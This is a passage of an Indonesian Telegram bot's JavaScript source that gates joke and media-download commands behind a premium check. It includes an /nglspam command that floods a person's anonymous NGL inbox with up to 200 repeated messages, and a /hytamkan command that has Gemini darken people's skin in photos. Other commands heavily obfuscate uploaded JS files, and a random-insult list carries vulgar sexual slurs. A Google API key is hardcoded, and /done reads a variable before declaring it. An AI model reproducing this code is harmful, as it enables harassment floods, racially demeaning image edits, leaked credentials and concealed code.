  if (nilai >= 30) return "😅 Masih PDKT, nunggu sinyal.";
  if (nilai >= 20) return "🥲 Sering ngechat, tapi dicuekin.";
  if (nilai >= 10) return "🫠 Naksir diam-diam.";
  return "❌ Jomblo murni, nggak ada harapan sementara ini.";
}

// Command
bot.onText(/^\/cekpacar$/, (msg) => {
  const nilai = Math.floor(Math.random() * 101); // nilai 0-100
  const teks = `
💕 *Tes Kepacaran*
👤 Nama: *${msg.from.first_name}*
📊 Nilai: *${nilai}%*
🗣️ Komentar: ${komentarPacar(nilai)}
  `.trim();

  bot.sendMessage(msg.chat.id, teks, { parse_mode: 'Markdown' });
});

bot.onText(/^\/cekkhodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();

  if (!nama) {
    return bot.sendMessage(chatId, 'ɴᴀᴍᴀɴʏᴀ ᴍᴀɴᴀ ᴀɴᴊᴇɴɢ🤓');
  }

  const khodamList = [
    'si ganteng',
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'maling pulpen', 
    'kak gem', 
    'suster ngesot', 
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'jadi lc', 
    'suka ngentot tiap hari', 
    'tukang caper',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong',
    'ambalambu',
    'megawati',
    'jokowi', 
    'polisi', 
    'sempak bolong', 
    'bh bolong',
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `
<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ:</b>
╭───────────────────
├ •ɴᴀᴍᴀ : ${nama}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(khodamList)}
├ •ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰───────────────────
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});

bot.onText(/\/Enchard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const randomImage = getRandomImage();
    const isPremium = await premium (senderId);    
    const chatType = msg.chat.type;
           
            
      if (isGroupOnly() && chatType === 'private') {
      return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/enchard')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

  //cekprem//
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama iif Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀ThunderVisIsback舀" + "肀ThunderVisIsback舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireIsBack舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃ - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});


bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/iqc')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

            //cek prem//
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh:\n`/iqc iiftzy | 21:45 | 77 | TELKOMSEL`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "00:00";
  const battery = parts[2] || "100";
  const carrier = parts[3] || "INDOSAT OOREDOO";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `🪄 *iPhone Quoted Generator ?*
      
💬 \`${text}\`
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝐃𝐞𝐯𝐨𝐥𝐨𝐩𝐞𝐫 」", url: "https://t.me/iiframijud1" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});
bot.onText(/\/done (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const randomImage = getRandomImage();
    const isPremium = await premium (senderId);
    const senderId = msg.from.id;
    const chatType = msg.chat.type;
           
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/done')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

          
 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
  <blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
    
    const text = match[1]; // Teks setelah perintah /done
    let t = text.split(',');
    
    if (t.length < 7) {
        return bot.sendMessage(chatId, 
            `*Format salah!*\n\nPenggunaan:\n/done trx,barang,harga,tanggal,nowa,usernametele,chanelid\n\n*Contoh:*\n\`/done TRX001,Script Bot,100000,12/08/2023,6289521456041,vinzzcode,0029VbAlqqWGU3BL27WTTQ3G\`\n\n*Pastikan untuk menggunakan koma sebagai pemisah!*`, 
            {parse_mode: 'Markdown'}
        );
    }
    
    let trx = t[0].trim();
    let barang = t[1].trim();
    let price = t[2].trim();
    let date = t[3].trim();
    let nowa = t[4].trim();
    let usernametele = t[5].trim();
    let chanelid = t[6].trim();
    
    let teks = `
*#${trx}*

𝗔𝗟𝗛𝗔𝗠𝗗𝗨𝗟𝗜𝗟𝗟𝗔𝗛 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗗𝗢𝗡𝗘 ✅
━━━━━━━━━━━━━━━━━━━━
📦 BARANG   :  ${barang}
🔖 PRICE       :  ${price}
📅 DATE          :  ${date}

*TERIMAKASIH SUDAH MEMBELI* `;

    bot.sendMessage(chatId, teks, {
});
});



bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "7127454409"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @raraa_imuppp</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});
bot.onText(/\/hytamkan/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id;
const senderId = msg.from.id;
const randomImage = getRandomImage();
const isPremium = await premium (senderId);
const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/hytamkan')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Reply foto dengan caption /hytamkan</blockquote>`, {
    parse_mode: "HTML"
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏱️ Sedang memproses...</blockquote>`, {
    parse_mode: "HTML"
    });

  try {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const file = await bot.getFile(fileId);

    const url = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const response = await fetch(url);
    const buffer = Buffer.from(await response.arrayBuffer());
    const base64Image = buffer.toString("base64");

    const genAI = new GoogleGenerativeAI("AIzaSyDoMqqCBjo5wF4YLVnIJTX3h1hISR6NPKo"); // ganti API key
    const promptText =
      "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam se hitam-hitam nya";

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: "image/jpeg", data: base64Image } },
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const result = await model.generateContent(contents);

    let resultImage;
    for (const part of result.response.candidates[0].content.parts) {
      if (part.inlineData) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
      }
    }

    if (resultImage) {
      const tempPath = `./hytam_${Date.now()}.png`;
      fs.writeFileSync(tempPath, resultImage);

      await bot.sendPhoto(chatId, tempPath, {
        caption: `<blockquote>✅ berhasil menghitamkan</blockquote>`,
        parse_mode: "HTML",
      });

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      bot.sendMessage(chatId, `<blockquote>❌ Gagal memproses gambar.</blockquote>`, {
    parse_mode: "HTML"
    });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `<blockquote>⚠️ Error: ${error.message}</blockquote>`, {
    parse_mode: "HTML"
    });
  }
});
async function tiktok(url) {
  try {
    const encodedParams = new URLSearchParams();
    encodedParams.set("url", url);
    encodedParams.set("hd", "1");

    const response = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": "current_language=en",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      },
    });

    if (!response.data || !response.data.data) {
      throw new Error("Gagal mendapatkan data TikTok");
    }

    const videos = response.data.data;
    return {
      title: videos.title,
      cover: videos.cover,
      origin_cover: videos.origin_cover,
      no_watermark: videos.play,
      watermark: videos.wmplay,
      music: videos.music,
    };
  } catch (error) {
    throw error;
  }
}

bot.onText(/^\/tiktok(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1];
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/tiktok')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  if (!url) {
    return bot.sendMessage(chatId, `<blockquote>☘️ Link TikTok-nya Mana?</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

 
  const urlRegex = /^(https?:\/\/)?([\w.-]+)+(:\d+)?(\/\S*)?$/;
  if (!urlRegex.test(url)) {
    return bot.sendMessage(chatId, `<blockquote>⚠️ Itu Bukan Link Yang Benar</blockquote>`, { 
    parse_mode: "HTML" 
    });
  }

  bot.sendMessage(chatId, `<blockquote>⏳ Tunggu sebentar, sedang mengambil video...</blockquote>`, {
        parse_mode: "HTML"
        });

  try {
  const res = await tiktok(url);

 
  let caption = `🎬 Judul: ${res.title}`;
     if (caption.length > 1020) {
     caption = caption.substring(0, 1017) + "...";
  }

await bot.sendVideo(chatId, res.no_watermark, { caption });
 
  if (res.music && res.music.trim() !== "") {
    await bot.sendAudio(chatId, res.music, { title: "tiktok_audio.mp3" });
  } else {
    await bot.sendMessage(chatId, `<blockquote>🎵 Video ini tidak memiliki audio asli.</blockquote>`, {
        parse_mode: "HTML"
        });
  }

} catch (error) {
  console.error(error);
  bot.sendMessage(chatId, `<blockquote>⚠️ Terjadi kesalahan saat mengambil video TikTok. Coba lagi nanti.</blockquote>`, {
        parse_mode: "HTML"
        });
}
});
bot.onText(/\/nglspam (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].trim().split(" ");
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
                      
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/nglspam')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
    if (args.length < 3) {
      return bot.sendMessage(
        chatId, `<blockquote>Format Salah!\n\nContoh: /ngl link text jumlah\n/ngl https://ngl.link/angkasa lu jelek 20 </blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    const link = args[0];
    const jumlah = parseInt(args[args.length - 1]);
    const pesan = args.slice(1, -1).join(" ");

    if (!/^https?:\/\/ngl\.link\//i.test(link)) {
      return bot.sendMessage(chatId, `<blockquote>❌ Link NGL tidak valid! Pastikan formatnya https://ngl.link/username</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    if (isNaN(jumlah) || jumlah < 1 || jumlah > 200) {
      return bot.sendMessage(chatId, `<blockquote>❌ Jumlah pesan harus angka 1 - 100.</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }

    try {
      const processingMsg = await bot.sendMessage(chatId, `<blockquote>⏳ Mengirim ${jumlah} pesan ke NGL...</blockquote>`, {
        parse_mode: 'HTML' 
        });

      const apiUrl = `https://api.siputzx.my.id/api/tools/ngl`;
      let success = 0, failed = 0;

      for (let i = 0; i < jumlah; i++) {
        try {
          await axios.post(apiUrl, {
            link: link,
            text: pesan
          }, { timeout: 10000 });

          success++;
          await new Promise(r => setTimeout(r, 1500));
        } catch {
          failed++;
        }
      }

      await bot.deleteMessage(chatId, processingMsg.message_id);

      await bot.sendMessage(
        chatId,
        `<blockquote>✅ Selesai Kirim Pesan NGL\n\n📩 Pesan: "${pesan}"\n📦 Total: ${jumlah}\n☑️ Berhasil: ${success}\n❌ Gagal: ${failed}</blockquote>`, {
        parse_mode: 'HTML' 
        });

    } catch (err) {
      console.error('[NGL ERROR]', err.message);
      bot.sendMessage(chatId, `<blockquote>❌ Gagal kirim ke NGL: ${err.message}</blockquote>`, {
        parse_mode: 'HTML' 
        });
    }
});



bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
const senderId = msg.from.id;
const userId = msg.from.id;
  const chatId = msg.chat.id
const randomImage = getRandomImage();
  const query = (match[1] || "").trim()
 const isPremium = await premium (senderId);
 const chatType = msg.chat.type;
            
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
    }

  if (blacklistedCommands.includes('/crashandro')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 
  if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  if (!query) {
    return bot.sendMessage(chatId, "play judul lagu atau video", {
      reply_to_message_id: msg.message_id,
    })
  }
  try {  
    const searchRes = await axios.get(
`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`
    )
    const results = searchRes.data?.data
    if (!results || !results.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const video = results[0]
    const audioRes = await axios.get(
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`
    )
    const audioUrl = audioRes.data?.result
    if (!audioUrl) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil audio.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const caption = `<blockquote><b>
title: ${video.title}
channel: ${video.author?.name || "Unknown"}
duration: ${video.duration?.timestamp || "-"}
views: ${video.views} views
uploaded: ${video.ago}</b></blockquote>
`
const tmpFile = path.join(__dirname, `${video.title}.mp3`)
const audioResStream = await axios({
  method: "get",
  url: audioUrl,
  responseType: "stream"
})
audioResStream.data.pipe(fs.createWriteStream(tmpFile))
await new Promise((resolve, reject) => {
  audioResStream.data.on("end", resolve)
  audioResStream.data.on("error", reject)
})
await bot.sendAudio(chatId, tmpFile, {
  title: video.title,
  performer: video.author?.name || "Unknown",
  thumb: video.thumbnail,
  caption,
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id
})
fs.unlinkSync(tmpFile)
  } catch (err) {
    console.error(err.response?.data || err.message)
    bot.sendMessage(chatId, err.response?.data || err.message, {
      reply_to_message_id: msg.message_id,
    })
  }
})


async function uploadCatbox(buffer) {
  const { ext, mime } = (await fileTypeFromBuffer(buffer)) || {
    ext: "jpg",
    mime: "image/jpeg",
  };

  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", buffer, {
    filename: `image.${ext}`,
    contentType: mime,
  });

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: form,
  });

  if (!res.ok) throw new Error("❌ Upload ke Catbox gagal.");
  return await res.text();
}

async function uploadToCatbox(fileBuffer, filename) {
  const form = new FormData();
  form.append('reqtype', 'fileupload');
  form.append('fileToUpload', fileBuffer, filename);

  const res = await fetch('https://catbox.moe/user/api.php', {
    method: 'POST',
    body: form
  });

  const text = await res.text();
  if (!res.ok || text.startsWith('ERROR')) {
    throw new Error('Upload gagal: ' + text);
  }
  return text.trim();
}

bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id; 
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const isPremium = await premium (senderId);
  const replyMsg = msg.reply_to_message;
  const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
    }

  if (blacklistedCommands.includes('/tourl')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   
        
 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
    <blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

  if (!replyMsg) {
    return bot.sendMessage(chatId, `<blockquote>❌ Balas sebuah pesan yang berisi file/audio/video dengan perintah /tourl </blockquote>`, {
    parse_mode: "HTML"
  });
  }

  if (!replyMsg.document && !replyMsg.photo && !replyMsg.video && !replyMsg.audio && !replyMsg.voice) {
    return bot.sendMessage(chatId,`<blockquote>❌ Pesan yang kamu balas tidak mengandung file/audio/video yang bisa diupload.</blockquote>`, {
    parse_mode: "HTML"
  });
  }

  try {
    let fileId, filename;

    if (replyMsg.document) {
      fileId = replyMsg.document.file_id;
      filename = replyMsg.document.file_name;
    } else if (replyMsg.photo) {
      const photoArray = replyMsg.photo;
      fileId = photoArray[photoArray.length - 1].file_id;
      filename = 'photo.jpg';
    } else if (replyMsg.video) {
      fileId = replyMsg.video.file_id;
      filename = replyMsg.video.file_name || 'video.mp4';
    } else if (replyMsg.audio) {
      fileId = replyMsg.audio.file_id;
      filename = replyMsg.audio.file_name || 'audio.mp3';
    } else if (replyMsg.voice) {
      fileId = replyMsg.voice.file_id;
      filename = 'voice.ogg';
    }

    const fileLink = await bot.getFileLink(fileId);
    const response = await fetch(fileLink);
    const fileBuffer = Buffer.from(await response.arrayBuffer());

    const catboxUrl = await uploadToCatbox(fileBuffer, filename);

    bot.sendMessage(chatId, `<blockquote>✅ File berhasil diupload ke Catbox:\n${catboxUrl}</blockquote>`, {
    parse_mode: "HTML"
  });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `<blockquote>❌ Gagal upload file: ${err.message}</blockquote>`, {
    parse_mode: "HTML"
  });
  }
});


// === /getcode <url> ===
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const isPremium = await premium (senderId);
  const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/getcode')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
   const userId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
           
            
 if (isGroupOnly() && chatType === 'private') {
 return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/crashandro')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/^\/(cvid|veo3)(?:\s+(.+))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const command = match[1]; // cvid atau veo3
   const text = match[2] || '';
   const userId = msg.from.id;
   const randomImage = getRandomImage();
   const senderId = msg.from.id;
   const isPremium = await premium (senderId);
   const chatType = msg.chat.type;
          
  if (isGroupOnly() && chatType === 'private') {
  return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/cvid')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

 if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}

    if (!text) {
